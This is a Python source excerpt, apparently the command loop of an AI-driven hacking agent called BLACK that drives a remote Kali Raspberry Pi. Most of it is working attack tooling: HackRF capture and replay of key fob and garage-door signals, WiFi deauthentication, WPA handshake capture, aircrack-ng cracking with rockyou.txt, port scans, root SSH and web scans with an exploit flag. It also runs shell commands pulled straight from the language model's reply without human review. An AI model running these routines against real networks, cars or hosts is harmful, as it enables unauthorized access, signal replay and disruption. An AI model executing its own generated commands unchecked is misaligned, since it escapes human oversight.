                    print("\n[BLACK] Scanning WiFi networks...")
                    result = agent.execute_command('netsh wlan show networks mode=bssid')
                    if result["success"]:
                        import re
                        output = result['stdout']
                        ssids = re.findall(r'SSID \d+ : (.+)', output)
                        bssids = re.findall(r'BSSID \d+ : ([0-9a-fA-F:]+)', output)
                        signals = re.findall(r'Signal\s+:\s+(\d+%)', output)
                        channels = re.findall(r'Channel\s+:\s+(\d+)', output)
                        auths = re.findall(r'Authentication\s+:\s+(.+)', output)
                        
                        print(f"[WIFI NETWORKS] Found {len(ssids)} networks:")
                        for i, ssid in enumerate(ssids):
                            bssid = bssids[i] if i < len(bssids) else "?"
                            signal = signals[i] if i < len(signals) else "?"
                            channel = channels[i] if i < len(channels) else "?"
                            auth = auths[i].strip() if i < len(auths) else "?"
                            redacted_bssid = bssid[:8] + "XX:XX:XX" if len(bssid) > 8 else bssid
                            print(f"  [{i+1}] SSID: {ssid}")
                            print(f"      BSSID: {redacted_bssid} | CH: {channel} | Signal: {signal} | Auth: {auth}")
                    continue
            
            if any(x in lower for x in ["hackrf", "sdr", "radio", "rf capture", "rf replay", "spectrum", "keyfob", "key fob", "fob"]):
                if "info" in lower or "status" in lower or "check" in lower:
                    print("\n[BLACK] Checking HackRF status on Pi...")
                    r = agent.kali_exec( "hackrf_info 2>&1")
                    print(f"[HACKRF]\n{r.get('stdout', r.get('error', ''))}")
                    continue
                
                elif "sweep" in lower or "find" in lower or "detect" in lower:
                    import re
                    if "2.4" in lower or "wifi" in lower or "bluetooth" in lower:
                        freq_range = "2400:2500"
                        desc = "2.4 GHz (WiFi/Bluetooth)"
                    elif "5g" in lower or "5.8" in lower:
                        freq_range = "5700:5900"
                        desc = "5.8 GHz (WiFi/FPV)"
                    elif "900" in lower or "915" in lower or "lora" in lower:
                        freq_range = "900:930"
                        desc = "900 MHz (LoRa/IoT)"
                    elif "fm" in lower:
                        freq_range = "88:108"
                        desc = "FM Radio"
                    else:
                        freq_range = "300:500"
                        desc = "300-500 MHz (car fobs, remotes)"
                    
                    print(f"\n[BLACK] Spectrum sweep: {desc}")
                    print("[*] Scanning for active signals...")
                    
                    cmd = f"hackrf_sweep -f {freq_range} -w 500000 -1 2>/dev/null"
                    r = agent.kali_exec( cmd)
                    output = r.get('stdout', '')
                    
                    if output:
                        hotspots = []
                        for line in output.strip().split('\n'):
                            parts = line.split(',')
                            if len(parts) >= 7:
                                freq_low = float(parts[2]) / 1000000
                                powers = [float(p) for p in parts[6:] if p.strip()]
                                max_power = max(powers) if powers else -100
                                if max_power > -50:
                                    hotspots.append((freq_low, max_power))
                        
                        print("\n╔════════════════════════════════════════════════╗")
                        print("║  SPECTRUM ANALYSIS                             ║")
                        print("╠════════════════════════════════════════════════╣")
                        
                        if hotspots:
                            hotspots.sort(key=lambda x: x[1], reverse=True)
                            for freq, power in hotspots[:10]:
                                bars = "█" * int((power + 100) / 5)
                                status = "🔥 HOT" if power > -30 else "📡 ACTIVE" if power > -40 else ""
                                print(f"║  {freq:>7.2f} MHz │ {power:>6.1f} dB │ {bars:<10} {status}")
                            print("╠════════════════════════════════════════════════╣")
                            print(f"║  Found {len(hotspots)} active frequencies              ║")
                        else:
                            print("║  No strong signals detected (all < -50 dB)     ║")
                            print("║  This is normal - nothing transmitting nearby  ║")
                        print("╚════════════════════════════════════════════════╝")
                        print("\n[*] Try: 'hackrf sweep 2.4ghz' for WiFi band")
                        print("[*] Or wait for someone to use a key fob nearby")
                    else:
                        print("[!] No output. Try: 'hackrf info'")
                    continue
                
                elif "scan" in lower or "spectrum" in lower:
                    import re
                    freq_match = re.search(r'(\d+)\s*(mhz|ghz|m|g)?', lower)
                    if freq_match:
                        freq = int(freq_match.group(1))
                        unit = freq_match.group(2) or 'mhz'
                        if 'g' in unit.lower():
                            freq = freq * 1000000000
                        elif 'm' in unit.lower():
                            freq = freq * 1000000
                        else:
                            freq = freq * 1000000
                    else:
                        freq = 433920000
                    
                    print(f"\n[BLACK] Scanning RF spectrum around {freq/1000000:.2f} MHz...")
                    print("[*] Capturing 5 seconds of data...")
                    cmd = f"sudo hackrf_transfer -r /tmp/rf_capture.raw -f {freq} -s 2000000 -n 10000000 2>&1; ls -la /tmp/rf_capture.raw"
                    r = agent.kali_exec( cmd)
                    print(f"[RF CAPTURE]\n{r.get('stdout', r.get('error', ''))}")
                    print(f"\n[BLACK] Captured at {freq/1000000:.2f} MHz. Use 'hackrf analyze' to view.")
                    continue
                
                elif "capture" in lower or "record" in lower:
                    import re
                    freq_match = re.search(r'(\d+)\s*(mhz|ghz|m|g)?', lower)
                    duration_match = re.search(r'(\d+)\s*sec', lower)
                    
                    freq = 433920000
                    if freq_match:
                        f = int(freq_match.group(1))
                        unit = freq_match.group(2) or 'mhz'
                        if 'g' in unit.lower():
                            freq = f * 1000000000
                        else:
                            freq = f * 1000000
                    
                    duration = int(duration_match.group(1)) if duration_match else 10
                    samples = duration * 2000000
                    
                    print(f"\n[BLACK] Recording RF at {freq/1000000:.2f} MHz for {duration} seconds...")
                    timestamp = __import__('time').strftime('%Y%m%d_%H%M%S')
                    filename = f"/tmp/rf_{timestamp}.raw"
                    cmd = f"sudo hackrf_transfer -r {filename} -f {freq} -s 2000000 -n {samples} 2>&1; ls -la {filename}"
                    r = agent.kali_exec( cmd)
                    print(f"[RF CAPTURE]\n{r.get('stdout', r.get('error', ''))}")
                    agent._last_rf_capture = filename
                    agent._last_rf_freq = freq
                    continue
                
                elif "replay" in lower or "transmit" in lower or "tx" in lower:
                    if hasattr(agent, '_last_rf_capture'):
                        filename = agent._last_rf_capture
                        freq = agent._last_rf_freq
                        print(f"\n[BLACK] WARNING: Transmitting RF! Ensure you have authorization!")
                        print(f"[*] Replaying {filename} at {freq/1000000:.2f} MHz...")
                        cmd = f"sudo hackrf_transfer -t {filename} -f {freq} -s 2000000 -x 40 2>&1"
                        r = agent.kali_exec( cmd)
                        print(f"[RF TRANSMIT]\n{r.get('stdout', r.get('error', ''))}")
                    else:
                        print("[!] No capture file. First run 'hackrf capture <freq>'")
                    continue
                
                elif "list" in lower or "files" in lower:
                    print("\n[BLACK] RF capture files on Pi:")
                    r = agent.kali_exec( "ls -lah /tmp/*.raw 2>/dev/null || echo 'No captures found'")
                    print(r.get('stdout', ''))
                    continue
                
                elif "fm" in lower or "radio" in lower:
                    import re
                    freq_match = re.search(r'(\d+\.?\d*)', lower)
                    freq = float(freq_match.group(1)) if freq_match else 100.3
                    freq_hz = int(freq * 1000000)
                    print(f"\n[BLACK] Tuning to FM {freq} MHz...")
                    print("[*] Recording 5 seconds of audio...")
                    cmd = f"hackrf_transfer -r /tmp/fm.raw -f {freq_hz} -s 2000000 -n 10000000 2>&1"
                    r = agent.kali_exec( cmd)
                    print(f"[FM CAPTURE] Saved to /tmp/fm.raw")
                    print(f"[*] To decode: sox -t raw -r 2000000 -e signed -b 8 -c 2 /tmp/fm.raw -t wav audio.wav")
                    continue
                
                elif "decode" in lower or "auto" in lower:
                    print("\n[BLACK] Auto-detecting RF signals with Kismet...")
                    print("[*] This listens for weather stations, tire sensors, doorbells, etc.")
                    r = agent.kali_exec( "timeout 30 kismet_cap_sdr_rtl433 --source rtl433-0 2>&1 | head -50 || echo 'Kismet rtl433 not configured'")
                    print(r.get('stdout', r.get('error', '')))
                    continue
                
                elif "keyfob" in lower or "key fob" in lower or "fob capture" in lower:
                    freq = 433920000 if "433" in lower else 315000000
                    freq_mhz = freq / 1000000
                    print(f"\n[BLACK] Capturing key fob signals at {freq_mhz} MHz for 5 seconds...")
                    print("[*] PRESS YOUR KEY FOB NOW!\n")
                    r = agent.kali_exec( f"hackrf_transfer -r /tmp/fob.raw -f {freq} -s 2000000 -n 10000000 2>&1")
                    print(r.get('stdout', r.get('error', ''))[:500])
                    
                    print("\n[*] Analyzing capture for signal bursts...")
                    analyze_cmd = """python3 -c "
import numpy as np
data = np.fromfile('/tmp/fob.raw', dtype=np.int8)
iq = data[0::2] + 1j*data[1::2]
power = np.abs(iq)**2
avg = np.mean(power)
peak = np.max(power)
threshold = avg * 10
bursts = np.sum(power > threshold)
print(f'Average power: {10*np.log10(avg+1e-10):.1f} dB')
print(f'Peak power: {10*np.log10(peak+1e-10):.1f} dB')
print(f'Peak/Avg ratio: {peak/avg:.1f}x')
if peak/avg > 3:
    print('** SIGNAL DETECTED! Peak is ' + str(round(peak/avg,1)) + 'x above noise **')
else:
    print('No clear signal (ratio: ' + str(round(peak/avg,1)) + 'x, need >3x)')
"
"""
                    r2 = agent.kali_exec( analyze_cmd)
                    print(r2.get('stdout', r2.get('error', '')))
                    
                    agent._last_rf_capture = "/tmp/fob.raw"
                    agent._last_rf_freq = freq
                    print(f"\n[*] Commands: 'hackrf replay' to transmit at {freq_mhz} MHz")
                    continue
                
                elif "analyze" in lower:
                    if hasattr(agent, '_last_rf_capture'):
                        print(f"\n[BLACK] Analyzing {agent._last_rf_capture}...")
                        analyze_cmd = f"""python3 -c "
import numpy as np
data = np.fromfile('{agent._last_rf_capture}', dtype=np.int8)
iq = data[0::2] + 1j*data[1::2]
power = np.abs(iq)**2
window = 10000
smoothed = np.convolve(power, np.ones(window)/window, mode='valid')
avg = np.mean(smoothed)
threshold = avg * 3
bursts = []
in_burst = False
start = 0
for i, p in enumerate(smoothed):
    if p > threshold and not in_burst:
        in_burst = True
        start = i
    elif p <= threshold and in_burst:
        in_burst = False
        duration = (i - start) / 2000000 * 1000
        if duration > 1:
            bursts.append((start/2000000, duration))
print(f'File: {agent._last_rf_capture}')
print(f'Duration: {len(iq)/2000000:.2f} seconds')
print(f'Found {len(bursts)} signal bursts:')
for t, d in bursts[:10]:
    print(f'  {t:.3f}s - {d:.1f}ms burst')
if not bursts:
    print('  No bursts detected - try pressing fob closer')
"
"""
                        r = agent.kali_exec( analyze_cmd)
                        print(r.get('stdout', r.get('error', '')))
                    else:
                        print("[!] No capture to analyze. Run 'keyfob' first.")
                    continue
                
                elif "watch" in lower or "monitor" in lower or "wait" in lower:
                    import re
                    freq_match = re.search(r'(\d+)\s*(mhz|ghz|m|g)?', lower)
                    if freq_match:
                        freq = int(freq_match.group(1))
                        unit = freq_match.group(2) or 'mhz'
                        if 'g' in unit.lower():
                            freq = freq * 1000
                        center = freq
                    else:
                        center = 433
                    
                    print(f"\n[BLACK] Monitoring {center} MHz for signals...")
                    print("[*] Will alert when signal > -40 dB detected")
                    print("[*] Press Ctrl+C to stop\n")
                    
                    for i in range(10):
                        low = center - 5
                        high = center + 5
                        cmd = f"hackrf_sweep -f {low}:{high} -w 100000 -1 2>/dev/null"
                        r = agent.kali_exec( cmd)
                        
                        max_power = -100
                        for line in r.get('stdout', '').split('\n'):
                            parts = line.split(',')
                            if len(parts) >= 7:
                                powers = [float(p) for p in parts[6:] if p.strip()]
                                if powers:
                                    max_power = max(max_power, max(powers))
                        
                        if max_power > -40:
                            print(f"  🔥 SIGNAL DETECTED! {max_power:.1f} dB at {center} MHz")
                            print(f"  [*] Quick! Run: hackrf capture {center}mhz")
                        else:
                            print(f"  [{i+1}/10] {center} MHz: {max_power:.1f} dB (noise)")
                        
                        import time
                        time.sleep(1)
                    
                    print("\n[*] Monitoring complete. Use 'hackrf watch 315' to try another frequency.")
                    continue
                
                else:
                    print("\n[BLACK] HackRF commands:")
                    print("-" * 50)
                    print("  DETECTION:")
                    print("    hackrf info        - Check device status")
                    print("    hackrf sweep       - Find active signals (300-500MHz)")
                    print("    hackrf decode      - Auto-decode common protocols")
                    print("")
                    print("  CAPTURE & REPLAY:")
                    print("    hackrf capture 433mhz      - Record at frequency")
                    print("    hackrf capture 315mhz 20sec - Record for duration")
                    print("    hackrf replay              - Transmit last capture")
                    print("    hackrf list                - Show saved captures")
                    print("")
                    print("  FUN:")
                    print("    hackrf fm 100.3    - Tune to FM radio station")
                    print("-" * 50)
                    print("  Common frequencies:")
                    print("    315 MHz  - US garage doors, car fobs")
                    print("    433 MHz  - EU devices, weather stations, doorbells")
                    print("    868 MHz  - EU IoT, smart home")
                    print("    915 MHz  - US IoT, LoRa")
                    continue
            
            if "force monitor" in lower:
                print("\n[BLACK] FORCING monitor mode (killing WiFi services)...")
                agent.kali_exec( "sudo airmon-ng check kill 2>&1")
                mon_result = agent.kali_exec( "sudo airmon-ng start wlan0 2>&1")
                print(f"[MONITOR MODE]\n{mon_result.get('stdout', mon_result.get('error', ''))}")
                continue
            
            if lower.startswith("attack ") or lower.startswith("deauth ") or lower.startswith("target "):
                import re
                num_match = re.search(r'\d+', user_input)
                if num_match and hasattr(agent, '_scanned_networks'):
                    idx = int(num_match.group()) - 1
                    networks = agent._scanned_networks
                    if 0 <= idx < len(networks):
                        target = networks[idx]
                        print(f"\n[BLACK] TARGET SELECTED:")
                        print(f"  ESSID:   {target['essid']}")
                        print(f"  BSSID:   {target['bssid']}")
                        print(f"  Channel: {target['channel']}")
                        
                        print(f"\n[BLACK] What attack? Type one of:")
                        print(f"  1) deauth {target['bssid']}  - Disconnect clients")
                        print(f"  2) capture {target['bssid']} - Capture handshake")
                        print(f"  3) crack {target['bssid']}   - Crack with wordlist")
                        
                        agent._current_target = target
                    else:
                        print(f"[!] Invalid number. Pick 1-{len(networks)}")
                elif num_match:
                    print("[!] Run 'airodump scan' first to get network list")
                else:
                    bssid_match = re.search(r'([0-9A-Fa-f:]{17})', user_input)
                    if bssid_match:
                        bssid = bssid_match.group(1)
                        print(f"\n[BLACK] Sending deauth packets to {bssid}...")
                        deauth_result = agent.kali_exec( f"sudo aireplay-ng -0 10 -a {bssid} wlan0mon 2>&1")
                        print(f"[DEAUTH]\n{deauth_result.get('stdout', deauth_result.get('error', ''))}")
                continue
            
            if lower.startswith("capture "):
                import re
                bssid_match = re.search(r'([0-9A-Fa-f:]{17})', user_input)
                if bssid_match or hasattr(agent, '_current_target'):
                    bssid = bssid_match.group(1) if bssid_match else agent._current_target['bssid']
                    channel = agent._current_target.get('channel', '1') if hasattr(agent, '_current_target') else '1'
                    print(f"\n[BLACK] Starting handshake capture for {bssid}...")
                    print("[*] Will capture for 30 seconds while sending deauths...")
                    
                    cap_cmd = f"""
sudo airodump-ng -c {channel} --bssid {bssid} -w /tmp/capture wlan0mon &
sleep 5
sudo aireplay-ng -0 5 -a {bssid} wlan0mon
sleep 25
pkill airodump-ng
ls -la /tmp/capture* 2>/dev/null
"""
                    cap_result = agent.kali_exec( cap_cmd)
                    print(f"[CAPTURE]\n{cap_result.get('stdout', cap_result.get('error', ''))}")
                else:
                    print("[!] Specify BSSID or select target first with 'attack <number>'")
                continue
            
            if lower.startswith("crack "):
                import re
                bssid_match = re.search(r'([0-9A-Fa-f:]{17})', user_input)
                if bssid_match or hasattr(agent, '_current_target'):
                    bssid = bssid_match.group(1) if bssid_match else agent._current_target['bssid']
                    print(f"\n[BLACK] Attempting to crack {bssid}...")
                    print("[*] Using rockyou.txt wordlist...")
                    
                    crack_cmd = f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} /tmp/capture*.cap 2>&1 | head -50"
                    crack_result = agent.kali_exec( crack_cmd)
                    print(f"[CRACK ATTEMPT]\n{crack_result.get('stdout', crack_result.get('error', ''))}")
                else:
                    print("[!] Specify BSSID or select target first")
                continue
            
            if any(x in lower for x in ["aircrack", "airodump", "aireplay", "airmon", "monitor mode", "deauth", "handshake", "crack wifi", "wifi crack"]):
                print("\n[BLACK] Connecting to Kali Pi for WiFi attacks...")
                pi_result = agent.kali_exec( "which aircrack-ng && iwconfig 2>/dev/null | head -20")
                if pi_result["success"]:
                    print(f"[KALI PI CONNECTED]\n{pi_result['stdout']}")
                    
                    if "airodump" in lower or ("scan" in lower and "wifi" in lower) or "scan network" in lower:
                        print("\n[BLACK] Scanning for WiFi networks on Kali Pi...")
                        print("[*] Running 20 second scan (2.4GHz + 5GHz)...")
                        
                        agent.kali_exec( "sudo pkill airodump 2>/dev/null; rm -f /tmp/blackscan*.csv 2>/dev/null")
                        agent.kali_exec( "sudo airodump-ng wlan0mon -w /tmp/blackscan --output-format csv --band abg >/dev/null 2>&1 &")
                        
                        import time
                        time.sleep(22)
                        agent.kali_exec( "sudo pkill airodump 2>/dev/null")
                        
                        read_result = agent.kali_exec( "cat /tmp/blackscan-01.csv 2>/dev/null")
                        output = read_result.get('stdout', '')
                        
                        if output and 'BSSID' in output:
                            lines = output.split('\n')
                            networks = []
                            for line in lines:
                                if ',' in line and ':' in line and 'BSSID' not in line and 'Station' not in line:
                                    parts = line.split(',')
                                    if len(parts) >= 14:
                                        bssid = parts[0].strip()
                                        channel = parts[3].strip()
                                        power = parts[8].strip()
                                        essid = parts[13].strip()
                                        if bssid and len(bssid) == 17:
                                            networks.append({'bssid': bssid, 'channel': channel, 'power': power, 'essid': essid if essid else '(hidden)'})
                            
                            if networks:
                                print(f"\n[WIFI NETWORKS FOUND] {len(networks)} networks:")
                                print("-" * 75)
                                for i, net in enumerate(networks[:15], 1):
                                    essid_display = net['essid'][:20] if net['essid'] else '(hidden)'
                                    print(f"  [{i:2}] {essid_display:<20} BSSID: {net['bssid']} CH:{net['channel']:>3} PWR:{net['power']:>4}")
                                print("-" * 75)
                                print("\n[BLACK] To attack: 'attack <number>' then 'capture' then 'crack'")
                                
                                agent._scanned_networks = networks
                            else:
                                print("[!] No networks found. Try moving Pi closer or check antenna.")
                        else:
                            print("[!] Scan failed. Checking status...")
                            check = agent.kali_exec( "iwconfig wlan0mon 2>&1 | head -3")
                            print(check.get('stdout', 'No output'))
                            print("[*] Make sure monitor mode is enabled: 'monitor mode'")
                    
                    elif "monitor" in lower:
                        print("\n[BLACK] Checking Pi connection type first...")
                        check = agent.kali_exec( "ip route get 1.1.1.1 | head -1")
                        if "eth0" in check.get("stdout", ""):
                            print("[+] Pi connected via ETHERNET - safe to kill WiFi services!")
                            print("\n[BLACK] Killing interfering processes...")
                            agent.kali_exec( "sudo airmon-ng check kill 2>&1")
                            print("[BLACK] Enabling monitor mode...")
                            mon_result = agent.kali_exec( "sudo airmon-ng start wlan0 2>&1")
                            print(f"[MONITOR MODE]\n{mon_result.get('stdout', mon_result.get('error', ''))}")
                            iw_check = agent.kali_exec( "iwconfig 2>&1 | grep -E '(wlan|Mode)'")
                            print(f"[INTERFACE STATUS]\n{iw_check.get('stdout', '')}")
                        else:
                            print("[!] WARNING: Pi may be connected via WiFi!")
                            print("[!] Killing WiFi services could disconnect us.")
                            print("[!] Options: 1) Connect Pi via ethernet, 2) Use second WiFi adapter")
                            print("[!] Type 'force monitor' to proceed anyway (risky)")
                    
                    elif "deauth" in lower:
                        import re
                        bssid_match = re.search(r'([0-9A-Fa-f:]{17})', user_input)
                        if bssid_match:
                            bssid = bssid_match.group(1)
                            print(f"\n[BLACK] Sending deauth to {bssid}...")
                            deauth_result = agent.kali_exec( f"sudo aireplay-ng -0 5 -a {bssid} wlan0mon 2>&1")
                            print(f"[DEAUTH]\n{deauth_result.get('stdout', deauth_result.get('error', ''))}")
                        else:
                            print("[BLACK] Specify BSSID. Example: 'deauth AA:BB:CC:DD:EE:FF'")
                    
                    elif "crack" in lower or "aircrack" in lower:
                        print("\n[BLACK] Checking for capture files on Pi...")
                        cap_result = agent.kali_exec( "ls -la *.cap 2>/dev/null || echo 'No .cap files found'")
                        print(f"[CAPTURES]\n{cap_result.get('stdout', '')}")
                    
                    else:
                        print("\n[BLACK] Kali Pi ready for WiFi attacks!")
                        print("  Commands: 'monitor mode', 'airodump scan', 'deauth <BSSID>', 'aircrack'")
                else:
                    print(f"[ERROR] Cannot connect to Kali Pi: {pi_result.get('error', 'Unknown error')}")
                continue
            
            if "pcap" in lower or "wireshark" in lower or "capture" in lower:
                if "read" in lower or "analyze" in lower or "open" in lower:
                    import re
                    file_match = re.search(r'["\']?([^"\']+\.pcap[ng]?)["\']?', user_input, re.IGNORECASE)
                    if file_match:
                        pcap_file = file_match.group(1)
                        print(f"\n[BLACK] Analyzing pcap file: {pcap_file}")
                        pcap_code = f'''
try:
    from scapy.all import rdpcap, Ether, IP, TCP, UDP, ICMP
    packets = rdpcap(r"{pcap_file}")
    print(f"Total packets: {{len(packets)}}")
    
    stats = {{"TCP": 0, "UDP": 0, "ICMP": 0, "Other": 0}}
    ips = set()
    
    for pkt in packets:
        if IP in pkt:
            ips.add(pkt[IP].src)
            ips.add(pkt[IP].dst)
        if TCP in pkt:
            stats["TCP"] += 1
        elif UDP in pkt:
            stats["UDP"] += 1
        elif ICMP in pkt:
            stats["ICMP"] += 1
        else:
            stats["Other"] += 1
    
    print(f"Protocol breakdown: {{stats}}")
    print(f"Unique IPs: {{len(ips)}}")
    for ip in list(ips)[:10]:
        print(f"  {{ip}}")
except ImportError:
    print("scapy not installed. Run: pip install scapy")
except Exception as e:
    print(f"Error: {{e}}")
'''
                        result = agent.execute_python(pcap_code)
                        if result["success"]:
                            print(f"[PCAP ANALYSIS]\n{result['stdout']}")
                    else:
                        print("\n[BLACK] Specify a pcap file. Example: 'read pcap capture.pcap'")
                    continue
            
            lower = user_input.lower()
            is_scan_request = (
                lower in ["scan", "scan lan", "scan network", "network scan", "devices"] or
                ("device" in lower and "network" in lower) or
                ("device" in lower and "lan" in lower) or
                ("scan" in lower and ("network" in lower or "lan" in lower)) or
                ("what" in lower and "connected" in lower) or
                ("list" in lower and "device" in lower) or
                ("show" in lower and "device" in lower) or
                ("find" in lower and "device" in lower) or
                ("discover" in lower and ("device" in lower or "host" in lower)) or
                "arp" in lower
            )
            if is_scan_request:
                print("\n[BLACK] Executing network scan...")
                result = agent.execute_command("arp -a")
                if result["success"]:
                    print(f"[DEVICES FOUND]\n{result['stdout']}")
                else:
                    print(f"[ERROR] {result.get('error', 'Scan failed')}")
                continue
            
            if user_input.lower().startswith("nmap "):
                target = user_input[5:].strip()
                print(f"\n[BLACK] Running nmap on {target}...")
                result = agent.execute_command(f"nmap -sV -T4 {target}", timeout=120)
                if result["success"]:
                    print(f"[NMAP RESULTS]\n{result['stdout']}")
                else:
                    print(f"[!] nmap may not be installed. Using PowerShell port scan...")
                    ps_scan = f"1..1024 | ForEach-Object {{ $s = New-Object Net.Sockets.TcpClient; if($s.ConnectAsync('{target}',$_).Wait(100)){{$_}}; $s.Close() }}"
                    result2 = agent.execute_command(f'powershell -Command "{ps_scan}"', timeout=120)
                    if result2["success"]:
                        print(f"[OPEN PORTS]\n{result2['stdout']}")
                continue
            
            if ("port" in lower and "open" in lower) or ("port" in lower and "scan" in lower):
                import re
                ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', user_input)
                if ip_match:
                    target = ip_match.group(1)
                elif "omv" in lower or "openmediavault" in lower or "mediavault" in lower:
                    target = os.environ.get("BLACK_OMV_HOST")
                elif "laptop" in lower or "gpu" in lower:
                    target = agent.config.gpu_host or os.environ.get("BLACK_GPU_HOST")
                else:
                    target = None
                
                if target:
                    print(f"\n[BLACK] Scanning ports on {target}...")
                    scan_code = f'''
import socket
ports = [21,22,23,25,80,443,445,3306,3389,5555,8080,8443]
target = "{target}"
print(f"Scanning {{target}}...")
for p in ports:
    try:
        s = socket.socket()
        s.settimeout(0.5)
        if s.connect_ex((target, p)) == 0:
            print(f"  Port {{p}}: OPEN")
        s.close()
    except:
        pass
print("Scan complete.")
'''
                    result = agent.execute_python(scan_code)
                    if result["success"]:
                        print(f"[PORT SCAN RESULTS]\n{result['stdout']}")
                    continue
            
            if user_input.lower().startswith("ssh "):
                parts = user_input[4:].strip().split(" ", 2)
                if len(parts) >= 2:
                    host = parts[0]
                    cmd = parts[1] if len(parts) > 1 else "hostname"
                    user = "root"
                    if "@" in host:
                        user, host = host.split("@", 1)
                    print(f"\n[BLACK] SSH to {user}@{host}: {cmd}")
                    result = agent.ssh_execute(host, user, cmd)
                    if result["success"]:
                        print(f"[OUTPUT]\n{result['stdout']}")
                    else:
                        print(f"[ERROR] {result.get('error', 'SSH failed')}")
                else:
                    print("[BLACK] Usage: ssh user@host command")
                continue
            
            if any(x in user_input.lower() for x in ["what did you learn", "lessons", "what do you know", "your knowledge"]):
                lessons = agent.knowledge.get("lessons_learned", {})
                print("\n[BLACK] Here's what I learned from our engagements:\n")
                
                for lesson in lessons.get("lessons", []):
                    print(f"  * {lesson.get('lesson')}")
                    print(f"    Target: {lesson.get('target')}")
                    print(f"    Techniques: {lesson.get('techniques')}\n")
                
                chains = lessons.get("attack_chains", [])
                if chains:
                    print("  Attack chains I know:")
                    for chain in chains:
                        print(f"    - {chain.get('name')}: {chain.get('description')}")
                
                failed = lessons.get("failed_attempts", [])
                if failed:
                    print("\n  Things that didn't work (I won't try these again):")
                    for f in failed:
                        print(f"    - {f.get('technique')}")
                continue
            
            import re
            url_match = re.search(r'(https?://[^\s]+)', user_input)
            is_scan_request = any(kw in user_input.lower() for kw in ['scan', 'test', 'check', 'analyze', 'audit', 'pentest'])
            
            if url_match and is_scan_request:
                target_url = url_match.group(1)
                modules = []
                lower_input = user_input.lower()
                
                if 'sql' in lower_input or 'sqli' in lower_input:
                    modules.append('sqli')
                if 'xss' in lower_input or 'cross-site' in lower_input:
                    modules.append('xss')
                if 'js' in lower_input or 'javascript' in lower_input or 'baas' in lower_input:
                    pass
                if 'secret' in lower_input or 'credential' in lower_input:
                    modules.append('secrets')
                if 'auth' in lower_input:
                    modules.extend(['auth', 'jwt', 'session'])
                if 'api' in lower_input:
                    modules.extend(['api', 'graphql'])
                if 'all' in lower_input or 'full' in lower_input or 'comprehensive' in lower_input:
                    modules = ['sqli', 'xss', 'ssrf', 'lfi', 'secrets', 'headers', 'cors', 'auth']
                
                if not modules:
                    modules = ['sqli', 'xss', 'secrets', 'headers']
                
                print(f"\n[BLACK] Initiating LANTERN scan on {target_url}")
                print(f"[BLACK] Modules: {', '.join(modules)}")
                print(f"[BLACK] JavaScript analysis: ENABLED")
                print(f"\n{'='*60}")
                
                extra_args = []
                timeout = 300
                
                if 'exploit' in lower_input or 'aggressive' in lower_input:
                    extra_args.append("--exploit")
                    timeout += 300
                if 'deep' in lower_input or 'thorough' in lower_input:
                    extra_args.append("--deep")
                    timeout += 300
                if 'crawl' in lower_input or 'spider' in lower_input:
                    extra_args.append("--crawl")
                    timeout += 600
                if len(modules) > 5:
                    timeout += len(modules) * 60
                
                print(f"[BLACK] Timeout: {timeout//60} minutes")
                
                result = agent.run_lantern_scan(target_url, modules=modules, extra_args=extra_args, timeout=timeout)
                
                if result.get("success"):
                    print(f"\n[BLACK] Scan complete!")
                    stdout = result.get("stdout") or ""
                    stderr = result.get("stderr") or ""
                    output = stdout + stderr
                    if output:
                        for line in output.split('\n'):
                            if line.strip():
                                print(f"  {line}")
                    
                    report_path = f"reports/scan_{target_url.replace('://', '_').replace('/', '_').replace(':', '_')[:30]}.json"
                    try:
                        import json
                        from pathlib import Path
                        json_path = Path(__file__).parent.parent.parent / report_path
                        if json_path.exists():
                            with open(json_path) as f:
                                report_data = json.load(f)
                            findings = report_data.get("findings", [])
                            if findings:
                                print(f"\n[BLACK] Validating {len(findings)} findings...")
                                validation = asyncio.run(agent.validate_findings(findings))
                                stats = validation.get("stats", {})
                                print(f"\n{'─'*40}")
                                print(f"  VALIDATION RESULTS")
                                print(f"{'─'*40}")
                                print(f"  Total findings:    {stats.get('total', 0)}")
                                print(f"  Confirmed:         {stats.get('confirmed', 0)}")
                                print(f"  False positives:   {stats.get('false_positives', 0)}")
                                print(f"  Needs review:      {stats.get('needs_review', 0)}")
                                print(f"  Accuracy estimate: {stats.get('accuracy_estimate', 'N/A')}")
                                print(f"{'─'*40}")
                                
                                if validation.get("false_positives"):
                                    fp_list = validation['false_positives']
                                    print(f"\n[BLACK] ❌ FILTERED {len(fp_list)} FALSE POSITIVES:")
                                    for fp in fp_list[:5]:
                                        orig = fp.get("original", {})
                                        desc = orig.get("description", "Unknown")[:50]
                                        reason = fp.get("validation_method", "Unknown")
                                        evidence = fp.get("evidence", "")[:60]
                                        print(f"   • {desc}")
                                        print(f"     Reason: {reason}")
                                        if evidence:
                                            print(f"     Evidence: {evidence}")
                                    if len(fp_list) > 5:
                                        print(f"   ... and {len(fp_list) - 5} more")
                                
                                if validation.get("validated"):
                                    confirmed = validation['validated']
                                    print(f"\n[BLACK] ✓ CONFIRMED {len(confirmed)} REAL FINDINGS:")
                                    for v in confirmed[:5]:
                                        orig = v.get("original", {})
                                        sev = orig.get("severity", "?")
                                        desc = orig.get("description", "Unknown")[:50]
                                        conf = v.get("confidence", "?")
                                        print(f"   [{sev}] {desc} (Confidence: {conf})")
                    except Exception as e:
                        pass
                    
                    if output and ("CRITICAL" in output or "HIGH" in output):
                        print(f"\n[BLACK] VULNERABILITIES FOUND! Check the reports folder.")
                else:
                    error_msg = result.get('error') or result.get('stderr') or 'Unknown error'
                    print(f"\n[BLACK] Scan issue: {error_msg}")
                
                print(f"\n{'='*60}")
                continue
            
            print("\n[BLACK] Thinking...", end=" ", flush=True)
            
            response = asyncio.run(agent.think(user_input))
            
            print("\r" + " " * 20 + "\r", end="")
            print(f"\n[BLACK] {response}")
            
            response = response.split("<|")[0].strip()
            
            exec_matches = re.findall(r"execute_command\(['\"](.+?)['\"]\)", response)
            nmap_matches = re.findall(r"nmap\s+([^\s'\"]+)", response)
            lantern_matches = re.findall(r'run_lantern_scan\(["\']([^"\']+)["\'](?:,\s*modules=\[([^\]]+)\])?', response)
            
            if lantern_matches:
                for match in lantern_matches:
                    target = match[0]
                    modules_str = match[1] if len(match) > 1 and match[1] else ""
                    modules = [m.strip().strip('"\'') for m in modules_str.split(',')] if modules_str else ['sqli', 'xss']
                    print(f"\n[BLACK] Executing LANTERN scan: {target}")
                    result = agent.run_lantern_scan(target, modules=modules)
                    if result.get("success"):
                        stdout = result.get("stdout", "")
